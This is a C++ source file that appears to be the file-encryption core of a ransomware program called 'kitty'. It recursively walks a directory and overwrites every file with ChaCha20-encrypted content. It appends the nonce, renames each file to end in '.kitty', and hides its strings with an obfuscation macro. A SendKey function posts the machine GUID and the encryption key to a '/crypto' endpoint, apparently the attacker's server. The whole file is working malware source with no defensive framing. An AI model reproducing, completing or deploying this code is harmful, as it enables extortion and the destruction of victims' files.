#include <kitty/cryptor.h>
#include <openssl/rand.h>
#include <chacha/chacha20.h>
#include <fstream>
#include <iostream>
#include <adv/MetaString.h>
#include <kitty/system.h>
#include <kitty/log.h>
#include <execution>
#include <kitty/pool.h>

Cryptor::Cryptor()
{
	RAND_bytes(key, 32);
}

std::vector<std::string> blacklisted = {
	OBFUSCATED(".msi"),
	OBFUSCATED(".kitty")
};

bool Cryptor::RunFilesystem(std::filesystem::path startingPath)
{
	std::vector<std::string> paths;

	for (const auto& entry : std::filesystem::recursive_directory_iterator(startingPath))
	{
		if (entry.is_regular_file())
		{
			EncryptFileK(entry.path().string());
		}
	}

	return true;
}

bool Cryptor::EncryptFileK(std::string filePath) const
{
	for (const auto& be : blacklisted)
	{
		if (std::filesystem::path(filePath).extension() == be)
			return false;
	}

	std::cout << filePath << "\n";

	// read plaintext file
	FILE* fp{ fopen(filePath.c_str(), OBFUSCATED("rb"))};

	if (!fp)
	{
		KittyLog(OBFUSCATED("Opening plaintext file failed"), false);
		return false;
	}

	size_t sz{ 0 };
	fseek(fp, 0, SEEK_END);
	sz = ftell(fp);
	rewind(fp);

	if (sz > 100000000)
		return false;

	char* content{ (char*)malloc(sz) };

	if (!content)
	{
		KittyLog(OBFUSCATED("malloc for plaintext content failed"), false);
		return false;
	}

	fread(content, sizeof(char), sz, fp);
	fclose(fp);

	// generate nonce
	unsigned char nonce[12];
	RAND_bytes(nonce, 12);

	// encrypt data with key and nonce
	struct chacha20_context ctx {};
	chacha20_init_context(&ctx, (uint8_t*)key, (uint8_t*)nonce, 0);
	chacha20_xor(&ctx, (uint8_t*)content, sz);

	// overwrite file with encrypted data
	std::ofstream outfile(filePath, std::ios::binary);
	outfile.write(content, sz);
	outfile.close();

	// free file data
	free(content);

	// append nonce
	FILE* afile{ fopen(filePath.c_str(), OBFUSCATED("ab"))};

	if (!afile)
	{
		KittyLog(OBFUSCATED("Unable to open ciphertext file to append nonce"), false);
		return false;
	}

	fwrite(nonce, sizeof(nonce[0]), 12, afile);
	fclose(afile);

	// rename ciphertext file
	std::string newPath{ filePath };
	newPath += OBFUSCATED(".kitty");

	if (rename(filePath.c_str(), newPath.c_str()))
	{
		KittyLog(OBFUSCATED("Unable to rename ciphertext file"), false);
		return false;
	}

	return true;
}

bool Cryptor::SendKey() const
{
	char guid[64];
	GetMachineGuid(guid);

	nlohmann::json map{};
	map[OBFUSCATED("guid")] = guid;
	map[OBFUSCATED("key")] = key;
	return SendPost(OBFUSCATED("/crypto"), map);
}